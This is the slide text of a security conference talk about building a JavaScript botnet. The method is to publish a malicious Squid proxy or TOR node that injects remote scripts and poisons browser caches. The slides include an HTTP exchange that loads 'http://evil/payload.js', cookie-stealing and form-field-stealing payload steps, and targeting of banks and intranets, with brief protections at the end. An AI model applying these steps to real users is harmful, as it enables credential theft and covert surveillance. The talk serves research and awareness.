Owning "bad" guys 
{and mafia} with 
Javascript botnets 
Chema Alonso & Manu “The Sur” 
Let´s do a botnet but… 
• We are lazy 
• We haven´t money 
• We haven´t 0day 
• We aren´t the FBI 
• We aren´t either: 
• Google 
• Apple 
• Microsoft 
Let them to 
be infected 
Man in the Middle schemas 
• Intercept communications between client and server 
• Compromised channel  -> Pwned! 
• Network 
• ARP Spoofing 
• Rogue DHCP(6) 
• ICMPv6 Sppofing 
• SLAAC Attacks 
• DNS Spoofing 
• … 
• Evil FOCA Rulez! 
Man in the Browser 
• Plugins 
• BHO 
• Addons 
• Access to all data 
• Passwords 
• Code 
• Banking trojans 
• “A russian in my IE” 
JavaScript in the Middle 
• Poisoning Browser cache 
• No permanent 
• Deleting cache means infection cleaned 
• Cached content is used if not expired 
• Allows attackers to inject remote javascript 
• Access  to: 
• Cookies 
• Not HTTPOnly (more or less) 
• HTML Code 
• Form fields 
• URLs 
• Code execution 
• … 
Google Analytics js  & malware 
How to inject JavaScript code 
• Persistent XSS 
• Owning HTTP Servers 
• Network Man In the middle attacks 
• WiFi 
• ARP Spoofing 
• IPv6 
• Memcache attacks 
• Imagination 
- Framework to own bowser’s cache 
- Inject a javascript in each client 
- That javaScript loads payloads from C&C 
- http://beefproject.com  
- Very Well-Known 
How to create a 
JavaScript Botnet 
from the scratch 
TOR Nodes 
TOR Nodes 
Not a Rocket Scince…. 
Buy a bullet-Prof  
• Not: 
• The Pirate Bay 
• Amazon 
• (Remenber Wikileaks) 
• Megaupload 
Configure SQUID Proxy 
GET / HTTP/1.1 
Host: www.web.com  
GET / HTTP/1.1 
Host: www.web.com  
Response 
Home.html 
Response 
Home.html 
GET /a.jsp HTTP/1.1 
Host: www.web.com  
GET /a.jsp HTTP/1.1 
Host: www.web.com  
Response 
a.jsp 
Response 
a.Jsp + pasarela.js 
include http://evil/payload.js 
GET /payload.js HTTP/1.1 
Host: evil  
Configure SQUID Proxy 
Squid.conf: Activate URL rewrite program 
.htaccess: Apache No Expiration Policy 
Infect all JavaScript files 
Infect all JavaScript files 
Publish your Proxy 
Let Internet do the magic 
Do Payloads: Cookie stealing 
document.write(“ 
"); 
Do Payloads: Form fields stealing 
Enjoy 
Who ·”$”·$ is using 
this kind of services? 
Mafias: Help the Prince 
Mafias: Nigerian Scammers  
Mafias: Nigerian Scammers  
Mafias: Nigerian Scammers  
Mafias: Nigerian Scammers  
Mafias: Nigerian Scammers  
Mafias: Predators 
Mafias: Predators 
Mafias: Predators 
Mafias: Predators 
Mafias: Predators 
Mafias: Predators 
Mafias: Predators 
Dog Scammers 
Warning! This 
picture could hurt 
your emotions… 
Dog Scammers 
Psychotics 
Annonymous 
Annonymous 
Rare people in a rare World 
Hax0rs and defacers…. 
…hacking… 
… and hacked 
Intranets 
And, of course, Pr0n 
Pr0n 
Do Payloads: Infect webs for 
the future 
Targeting Attacks 
• Select the Target 
• Bank 
• Social Network 
• Intranet 
• Analyze loaded files 
• Payload: 
• Inject and load a infected file for that target, in 
every web the victim visits. 
• Profit. 
Demo Facebook 
Protections 
• Take care of mitm 
schemas 
• Proxy 
• TOR networks 
• After using them, clean 
all 
• Cache is not your friend 
on the Internet 
• VPNs is not a silver bullet 
Questions? 
PI:EMAIL 
PI:EMAIL